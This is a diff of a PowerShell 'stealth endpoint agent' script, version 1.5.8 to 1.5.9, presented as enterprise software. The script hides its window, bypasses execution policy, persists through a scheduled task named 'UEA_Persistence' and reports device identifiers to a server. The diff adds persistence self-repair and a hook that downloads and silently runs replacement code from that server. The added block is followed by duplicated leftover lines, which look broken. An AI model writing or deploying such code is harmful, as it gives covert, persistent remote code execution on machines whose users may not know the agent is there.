@@ -3,7 +3,7 @@ param(
 )
 
 # Unified Enterprise Agent (UEA)
-# Version: 1.5.8
+# Version: 1.5.9
 # Description: Professional stealth endpoint agent with premium Support GUI.
 
 # 1. ENVIRONMENT SANITATION
@@ -78,7 +78,7 @@ function Install-StealthAgent {
             }
         }
 
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.8" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.9" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -95,9 +95,9 @@ function Install-StealthAgent {
         Register-ScheduledTask -TaskName "UEA_Persistence" -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
         Start-ScheduledTask -TaskName "UEA_Persistence" | Out-Null
         
-        Log-Message "Stealth v1.5.8 Deployment Complete."
+        Log-Message "Stealth v1.5.9 Deployment Complete."
         if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
-            Write-Host "Equinox Stealth Architecture v1.5.8 Deployed. Background process starting..."
+            Write-Host "Equinox Stealth Architecture v1.5.9 Deployed. Background process starting..."
             exit
         }
     } catch { Log-Message "Install Fail: $($_.Exception.Message)" }
@@ -108,8 +108,9 @@ try {
     $AgentId = try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID } catch { "$($env:COMPUTERNAME)-$(Get-Random)" }
     $SerialNumber = try { (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber } catch { "Unknown" }
     
-    # 🛡️ Ghost-Proof Switch: Only install if we are NOT already running as the resident file
-    if ($PSCommandPath -ne $ScriptPath) {
+    # 🛡️ Ghost-Proof Switch: Only install if we are NOT already running as the resident file OR task is missing
+    $TaskExists = try { Get-ScheduledTask -TaskName "UEA_Persistence" -ErrorAction Stop } catch { $null }
+    if (($PSCommandPath -ne $ScriptPath) -or ($null -eq $TaskExists)) {
         Install-StealthAgent
     }
 
@@ -118,7 +119,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.5.8 Started. ID: $AgentId"
+    Log-Message "Agent v1.5.9 Started. ID: $AgentId"
     # 5. HEARTBEAT LOOP
     while ($true) {
         try {
@@ -129,7 +130,7 @@ try {
             $Payload = @{
                 agentId = $AgentId
                 serialNumber = $SerialNumber
-                version = "1.5.8"
+                version = "1.5.9"
                 status = "online"
                 deviceName = $env:COMPUTERNAME
                 os = $OS
@@ -141,7 +142,14 @@ try {
             $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body $BodyJson -ContentType "application/json"
 
             # Upgrade Hook
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.5.8")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.5.9")) {
+                Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
+                Install-StealthAgent
+                $VbsRestart = "$InstallDir\restart.vbs"
+                "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False" | Out-File -FilePath $VbsRestart -Force -Encoding ascii
+                Start-Process "wscript.exe" -ArgumentList "`"$VbsRestart`""
+                exit
+            }
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
